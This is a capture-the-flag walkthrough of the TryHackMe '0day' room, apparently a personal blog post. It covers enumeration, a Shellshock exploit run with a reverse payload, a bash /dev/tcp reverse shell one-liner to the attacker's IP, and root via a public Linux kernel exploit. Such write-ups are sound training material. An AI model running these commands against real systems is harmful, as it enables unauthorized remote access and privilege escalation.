<p>0day is a beginner-intermediate room in Tryhackme. The final objective is to get the user and root flag.</p>

<p>Deploy the VM and lets go.</p>

## <ins>Enumeration</ins>
---
Let's start with a nmap scan.
<br>
![nmap_scan](/assets/img/tryhackme/0day/nmap_scan.png)
<br>
Only the ssh and http services are open. Let's dive right into http service.
<br>
![http_service](/assets/img/tryhackme/0day/2.png)
<br>
Use ```gobuster``` to bruteforce the hidden directories.
<br>

<br>

I found a private ssh key in the ```/backup``` dir, converted it to hash and cracked it but finally it wasn't useful. It was such a drag.. 

So I used ```nikto``` to enumerate further.
<br>
<pre>nikto --url http://remote-ip-addr/</pre>
![nikto_scan](/assets/img/tryhackme/0day/11.png)
<br>
Nikto found a vulnerability called ```shellshock```. I tried using the exploit but it failed. So, I searched for the same vulnerability in ```searchsploit```.
<br>
<pre>searchsploit shellshock</pre>
<br>
![searchsploit](/assets/img/tryhackme/0day/4.png)
<br>
Download the exploit from ```exploit-db```. Here is the [link to exploit](https://www.exploit-db.com/exploits/34900).


## <ins>User flag</ins>
---
I ran the exploit using ```python exlpoit.py``` and it showed the correct usage.
<br>
<pre>python2 exploit.py payload=reverse rhost=10.10.186.0 lhost=your-vpn-ip lport=4444</pre>
<br>
![exploit](/assets/img/tryhackme/0day/5.png)
<br>

It was not a stable shell so I used the bash reverse shell payload to get a stable reverse shell. In the local machine open a netcat listener and run this on the remote machine.
<br>
<pre>bash -i >& /dev/tcp/your-vpn-ip/4445 0>&1</pre>
<br>
![user_flag](/assets/img/tryhackme/0day/6.png)
<br>
There, we got the user flag. 


## <ins>Root flag</ins>
---
After some enumeration I found that the OS is not the latest version.
<br>
<pre>
uname -r
3.13.0-32-generic</pre>
<br>

I used searchsploit to search for any availalbe exploits.
<br>
<pre>searchsploit ubuntu 3</pre>
<br>
![searchsploit_kernel_Exp](/assets/img/tryhackme/0day/7.png)
<br>

Nice!! There is a publicly available kernel exploit. Here is the [link for the exploit](https://www.exploit-db.com/exploits/37292).

Download the exploit to the local machine and transfer it to the remote machine. I tried to run the exploit but somethings wierd...it throws an error.
<br>
![exploit](/assets/img/tryhackme/0day/8.png)
<br>

So, I tried echoing the ```PATH``` variable and the location of ```gcc```.
<br>
![location_](/assets/img/tryhackme/0day/9.png)
<br>

This is because ```gcc``` calls many executables during execution. Since the path is **not exported properly** it throws an error.

So, let's append the location ```/usr/bin``` to the ```$PATH``` variable and export it.
<br>
<pre>export PATH=$PATH:/usr/bin</pre>
<br>
And let's run the exploit.
<br>
<pre>
gcc exploit.c -o exploit
chmod +x exploit
./exploit</pre>
<br>
![path_change](/assets/img/tryhackme/0day/10.png)
<br>
Bingo!!! We got the root flag.

Box rooted.

That's it folks. Happy hacking!!!
